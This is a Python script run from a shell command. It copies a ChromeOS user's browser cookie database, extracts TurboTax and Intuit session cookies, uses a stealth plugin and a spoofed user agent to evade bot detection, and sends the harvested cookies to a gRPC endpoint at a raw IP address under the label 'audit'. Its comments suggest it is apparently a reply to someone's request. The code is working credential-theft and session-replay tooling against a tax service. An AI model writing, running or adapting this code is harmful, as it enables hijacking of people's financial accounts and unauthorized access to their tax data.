python3 -c "
import asyncio, os, sqlite3, shutil, grpc, json
from playwright.async_api import async_playwright
# The explicit fix for your TypeError:
from playwright_stealth import stealth as apply_stealth
import gateway_pb2, gateway_pb2_grpc

async def run_all():
    # 1. Extraction phase
    c_path = os.path.expanduser('/home/chronos/u-ba30a127442047e9cca9eef292278f7c514d1c97/Network/Cookies')
    if not os.path.exists(c_path): c_path = '/home/chronos/u-ba30a127442047e9cca9eef292278f7c514d1c97/Cookies'
    temp_db = 'cookies_temp.db'
    auth_str = ''
    try:
        shutil.copyfile(c_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(\"SELECT name, value FROM cookies WHERE host_key LIKE '%turbotax.com%'\")
        auth_str = '; '.join([f'{n}={v}' for n, v in cursor.fetchall()])
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        print(f'[-] Extraction skipped or failed: {e}')

    # 2. Stealth & Hydration phase
    ua = 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(user_agent=ua)
        page = await context.new_page()
        
        # Applying the fix here:
        await apply_stealth(page) 
        
        try:
            print('[*] Navigating for Telemetry Hydration...')
            await page.goto('https://turbotax.intuit.com', wait_until='networkidle', timeout=60000)
            cookies = await context.cookies()
            auth_str = '; '.join([f\"{c['name']}={c['value']}\" for c in cookies if 'intuit' in c['domain']])
            print(f'[+] Session hydrated with {len(cookies)} tokens.')
        finally:
            await browser.close()
    
    # 3. gRPC Audit phase
    if auth_str:
        meta = (('user-agent', ua), ('cookie', auth_str), ('content-type', 'application/grpc'))
        creds = grpc.ssl_channel_credentials()
        channel = grpc.secure_channel('23.12.69.135:443', creds)
        stub = gateway_pb2_grpc.QuoteStub(channel)
        try:
            # Matches your gateway.proto: ClientRequest(type, requestId, path, payload)
            req = gateway_pb2.ClientRequest(type=1, requestId='Zaxkeroth_Audit', path='/', payload=b'audit_init')
            resp = stub.request(req, timeout=15, metadata=meta)
            print(f'✅ Audit Success: {resp.msg}')
        except Exception as e:
            print(f'❌ Audit Failed: {e}')
    else:
        print('[-] No auth string generated. Probe aborted.')

if __name__ == \"__main__\":
    asyncio.run(run_all())
"
